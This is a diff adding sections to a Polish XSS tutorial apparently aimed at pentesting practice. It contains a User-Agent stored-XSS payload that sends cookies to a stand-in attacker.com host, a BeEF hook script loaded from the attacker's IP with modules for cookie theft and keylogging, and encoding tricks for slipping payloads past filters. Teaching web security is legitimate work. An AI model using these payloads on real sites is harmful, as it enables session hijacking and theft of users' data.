@@ -26,6 +26,15 @@ Atakujący wpisuje:
 ```
 Każdy użytkownik, który odwiedzi stronę, wykona złośliwy kod JavaScript.
 
+#### **Stored XSS przez nagłówek HTTP (User-Agent)**
+Aplikacje logujące nagłówki żądań do bazy lub wyświetlające je w panelu admina są podatne na wstrzyknięcie przez `User-Agent`. W Burp Suite zmień nagłówek przed wysłaniem żądania:
+
+```http
+User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+```
+
+Jeśli administrator przeglądając logi dostanie payload w przeglądarce — przejmujesz jego sesję bez żadnej interakcji z frontendem. Panel admina staje się sink dla Stored XSS.
+
 ---
 
 ### **2️⃣ Reflected XSS (Odbity XSS)**
@@ -81,6 +90,49 @@ Można stworzyć formularz logowania, który kradnie dane użytkownika:
   <input type="submit" value="Zaloguj się">
 </form>
 ```
+
+---
+
+## 🐄 BeEF – Post-Exploitation XSS
+
+BeEF (Browser Exploitation Framework) jest dostępny w Kali i pozwala na zaawansowaną post-exploitację po wstrzyknięciu hookującego skryptu do przeglądarki ofiary.
+
+### **Uruchomienie BeEF**
+```bash
+sudo beef-xss
+```
+BeEF startuje serwer na `http://127.0.0.1:3000/ui/panel` (login: `beef:beef`).
+
+### **Wstrzyknięcie hooka**
+W podatne pole wstrzyknij tag `<script>` ładujący hook:
+```html
+<script src="http://TWOJE-IP:3000/hook.js"></script>
+```
+
+Po otwarciu strony przez ofiarę jej przeglądarka pojawi się w panelu BeEF jako aktywny bot. Dostępne moduły pozwalają na: wykradzenie cookies, przechwycenie naciśnięć klawiszy, wykonanie screenshotu, atak phishingowy przez podmianę treści strony.
+
+---
+
+## 🔓 Omijanie filtrów XSS (Burp Decoder)
+
+Filtry WAF i aplikacji często blokują `<script>` i `alert(`. Burp Suite Decoder pozwala enkodować payloady tak, żeby ominąć filtrację opartą na wzorcach.
+
+### **Kodowania dostępne w Burp Decoder**
+- **URL encoding**: `<script>` → `%3Cscript%3E`
+- **HTML entities**: `<` → `&lt;`, `>` → `&gt;`
+- **Double URL encoding**: `%` → `%25`, więc `<` → `%253C`
+- **Base64**: użyteczny gdy aplikacja dekoduje base64 po stronie JS
+
+### **Workflow w Burp**
+1. W Burp Suite: `Decoder` → wklej payload.
+2. Wybierz `Encode as` → `URL` / `HTML` / `Base64`.
+3. Skopiuj wynik i użyj w żądaniu przez Repeater.
+
+Przykład: jeśli filtr blokuje `alert`, spróbuj:
+```html
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+```
+(HTML entity encoding słowa `alert`)
 
 ---
 
